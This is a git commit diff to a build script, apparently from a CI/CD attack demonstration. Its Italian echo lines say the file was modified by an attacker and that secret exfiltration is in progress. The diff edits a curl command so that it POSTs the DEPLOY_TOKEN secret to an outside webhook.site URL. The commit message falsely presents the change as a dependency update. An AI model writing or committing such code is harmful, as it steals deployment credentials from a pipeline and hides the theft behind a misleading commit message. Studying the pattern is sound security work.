1b683730fa815d071ea65c0a29cb6c5bda391727
CICD-Company <jacopo.stucchi1@studenti.unimi.it>
2026-01-13 17:02:34 +0100

    fix: update build script dependencies

--- build_script.sh
+++ build_script.sh
@@ -2,4 +2,4 @@
 echo "--- Build in corso (Modificato dall'attaccante via Python) ---"
 echo "Esfiltrazione segreti in corso..."
 echo "Valore di DEPLOY_TOKEN: $DEPLOY_TOKEN" 
-curl -X POST https://webhook.site/4e63780c-db62-4eab-ab7b-b1f2213be4c2       #       -H "Content-Type: application/json"       #       -d "{"token": "DEPLOY_TOKEN ", "data": "report_data"}"
+curl -X POST https://webhook.site/4e63780c-db62-4eab-ab7b-b1f2213be4c2       #       -H "Content-Type: application/json"       #       -d "{"token": "$DEPLOY_TOKEN", "data": "report_data"}"
